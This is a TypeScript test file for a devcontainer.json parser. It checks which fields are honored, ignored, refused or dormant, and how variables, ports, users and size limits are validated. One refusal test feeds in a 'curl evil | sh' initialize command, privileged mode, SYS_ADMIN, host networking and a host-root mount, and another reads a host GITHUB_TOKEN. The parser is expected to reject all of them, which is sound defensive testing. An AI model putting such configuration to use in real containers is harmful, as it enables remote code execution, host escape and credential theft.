import {
  DEVCONTAINER_DORMANT_FIELDS,
  DEVCONTAINER_HONORED_FIELDS,
  DEVCONTAINER_IGNORED_FIELDS,
  DEVCONTAINER_REFUSED_FIELDS,
  parseDevcontainer,
} from "./devcontainer"
import type { DeclarationParseResult } from "./environment-declaration"

const PATH = ".devcontainer/devcontainer.json"

function parse(text: string): DeclarationParseResult {
  return parseDevcontainer(text, PATH)
}

function problems(result: DeclarationParseResult) {
  return result.ok ? [] : result.problems.map(({ code, field }) => ({ code, field }))
}

describe("parseDevcontainer", () => {
  it("reads every honored field from a realistic JSONC file", () => {
    const result = parse(`{
      // Node + Postgres client
      "name": "acme-web",
      "image": "mcr.microsoft.com/devcontainers/typescript-node:1-22-bookworm",
      "containerEnv": { "NODE_ENV": "development", "PNPM_HOME": "\${containerWorkspaceFolder}/.pnpm" },
      "remoteEnv": { "PATH": "\${containerEnv:PATH}:/home/node/.local/bin", "NODE_ENV": null },
      "onCreateCommand": "corepack enable",
      "updateContentCommand": ["pnpm", "install", "--frozen-lockfile"],
      "postStartCommand": {
        "db": "pg_isready -h db",
        "10": ["echo", "ten"],
      },
      "forwardPorts": [3000, "5173"],
      "portsAttributes": { "3000": { "label": "Web", "onAutoForward": "notify" }, "8000-8010": { "label": "Range" } },
      "remoteUser": "node",
      "containerUser": "root",
      "customizations": { "vscode": { "extensions": ["dbaeumer.vscode-eslint"] } },
    }`)

    expect(result.ok).toBe(true)
    if (!result.ok) return
    expect(result.declaration).toEqual({
      file: "devcontainer",
      path: PATH,
      image: {
        registry: "mcr.microsoft.com",
        repository: "devcontainers/typescript-node",
        tag: "1-22-bookworm",
      },
      containerEnv: {
        PATH: "${containerEnv:PATH}:/home/node/.local/bin",
        PNPM_HOME: "/workspace/.pnpm",
      },
      lifecycleCommands: {
        onCreate: { kind: "shell", command: "corepack enable" },
        updateContent: { kind: "argv", argv: ["pnpm", "install", "--frozen-lockfile"] },
        postStart: {
          kind: "parallel",
          commands: {
            "10": { kind: "argv", argv: ["echo", "ten"] },
            db: { kind: "shell", command: "pg_isready -h db" },
          },
        },
      },
      forwardPorts: [{ port: 3000, label: "Web" }, { port: 5173 }],
      user: { name: "node", from: "remoteUser" },
      egressDomains: [],
    })
    expect(result.notices.map((notice) => notice.field).sort()).toEqual(["customizations", "name"])
  })

  it("keeps commas and brackets inside command strings intact", () => {
    const result = parse(`{ "image": "node:22", "postCreateCommand": "echo a,} && echo b,]", }`)
    expect(result.ok && result.declaration.lifecycleCommands.postCreate).toEqual({
      kind: "shell",
      command: "echo a,} && echo b,]",
    })
  })

  it("puts every refused field in the problems list, all at once", () => {
    const result = parse(`{
      "image": "node:22",
      "privileged": true,
      "capAdd": ["SYS_ADMIN"],
      "runArgs": ["--network=host"],
      "mounts": ["source=/,target=/host,type=bind"],
      "initializeCommand": "curl evil | sh",
      "dockerComposeFile": "compose.yml"
    }`)
    expect(problems(result)).toEqual(
      ["privileged", "capAdd", "runArgs", "mounts", "initializeCommand", "dockerComposeFile"].map(
        (field) => ({ code: "devcontainer_field_refused", field })
      )
    )
  })

  it("keeps image builds dormant until the build service exists", () => {
    for (const field of DEVCONTAINER_DORMANT_FIELDS) {
      const result = parse(
        JSON.stringify({ [field]: field === "build" ? { dockerfile: "Dockerfile" } : "x" })
      )
      expect(problems(result)).toEqual([
        { code: "devcontainer_build_requires_build_service", field },
      ])
    }
    const withImage = parse(JSON.stringify({ image: "node:22", features: { "ghcr.io/x/y:1": {} } }))
    expect(problems(withImage)).toEqual([
      { code: "devcontainer_build_requires_build_service", field: "features" },
    ])
  })

  it("refuses unknown top-level fields instead of skipping them", () => {
    expect(problems(parse(`{ "image": "node:22", "imagee": "typo" }`))).toEqual([
      { code: "declaration_field_unknown", field: "imagee" },
    ])
  })

  it("classifies every field in exactly one bucket", () => {
    const buckets = [
      DEVCONTAINER_HONORED_FIELDS,
      DEVCONTAINER_IGNORED_FIELDS,
      DEVCONTAINER_REFUSED_FIELDS,
      DEVCONTAINER_DORMANT_FIELDS,
    ].flat() as string[]
    expect(new Set(buckets).size).toBe(buckets.length)
  })

  it("refuses a GPU host requirement but ignores an optional one", () => {
    expect(problems(parse(`{ "image": "node:22", "hostRequirements": { "gpu": true } }`))).toEqual([
      { code: "devcontainer_gpu_not_supported", field: "hostRequirements.gpu" },
    ])
    const optional = parse(
      `{ "image": "node:22", "hostRequirements": { "cpus": 4, "gpu": "optional" } }`
    )
    expect(optional.ok).toBe(true)
    expect(optional.notices).toEqual([
      { code: "declaration_field_ignored", field: "hostRequirements" },
    ])
  })

  it("refuses variables that would copy the reading machine into the declaration", () => {
    const result = parse(`{
      "image": "\${localEnv:BASE_IMAGE}",
      "containerEnv": { "TOKEN": "\${localEnv:GITHUB_TOKEN}", "HOME_PATH": "\${containerEnv:HOME}" },
      "postCreateCommand": "cd \${localWorkspaceFolder}"
    }`)
    expect(problems(result)).toEqual([
      { code: "declaration_variable_unsupported", field: "image" },
      { code: "declaration_variable_unsupported", field: "containerEnv.TOKEN" },
      { code: "declaration_variable_unsupported", field: "containerEnv.HOME_PATH" },
      { code: "declaration_variable_unsupported", field: "postCreateCommand" },
    ])
  })

  it("reports invalid JSON with a position and duplicate keys by path", () => {
    const broken = parse(`{\n  "image": "node:22"\n  "remoteUser": "node"\n}`)
    expect(broken.ok).toBe(false)
    if (!broken.ok) {
      expect(broken.problems[0]).toMatchObject({
        code: "declaration_invalid_json",
        field: PATH,
        detail: { error: "CommaExpected", line: 3 },
      })
    }
    expect(problems(parse(`{ "image": "a", "containerEnv": { "X": "1", "X": "2" } }`))).toEqual([
      { code: "declaration_duplicate_key", field: "containerEnv.X" },
    ])
    expect(problems(parse(`[]`))).toEqual([{ code: "declaration_not_object", field: PATH }])
    expect(problems(parse(``))[0]?.code).toBe("declaration_invalid_json")
  })

  it("validates image, env, commands, ports and users", () => {
    const result = parse(`{
      "image": "Not/An:Image!",
      "containerEnv": { "COGNIA_TOKEN": "x", "1BAD": "y", "N": 3 },
      "postCreateCommand": { "a b": "x" },
      "postStartCommand": [],
      "forwardPorts": [0, "db:5432", 3000, 3000],
      "remoteUser": "node:node"
    }`)
    expect(problems(result)).toEqual([
      { code: "declaration_image_invalid", field: "image" },
      { code: "declaration_env_invalid", field: "containerEnv.N" },
      { code: "declaration_env_reserved", field: "containerEnv.COGNIA_TOKEN" },
      { code: "declaration_env_invalid", field: "containerEnv.1BAD" },
      { code: "declaration_command_invalid", field: "postCreateCommand.a b" },
      { code: "declaration_command_invalid", field: "postStartCommand" },
      { code: "declaration_port_invalid", field: "forwardPorts[0]" },
      { code: "declaration_port_invalid", field: "forwardPorts[1]" },
      { code: "declaration_port_invalid", field: "forwardPorts[3]" },
      { code: "declaration_user_invalid", field: "remoteUser" },
    ])
  })

  it("requires an image and falls back to containerUser, numeric uids included", () => {
    expect(problems(parse(`{ "remoteUser": "node" }`))).toEqual([
      { code: "declaration_image_missing", field: "image" },
    ])
    const result = parse(`{ "image": "python:3.12-slim", "containerUser": "1000" }`)
    expect(result.ok && result.declaration.user).toEqual({ uid: 1000, from: "containerUser" })
  })

  it("refuses files over the size limit before parsing", () => {
    const result = parse(`{ "image": "node:22", "name": "${"x".repeat(300 * 1024)}" }`)
    expect(problems(result)).toEqual([{ code: "declaration_too_large", field: PATH }])
  })
})
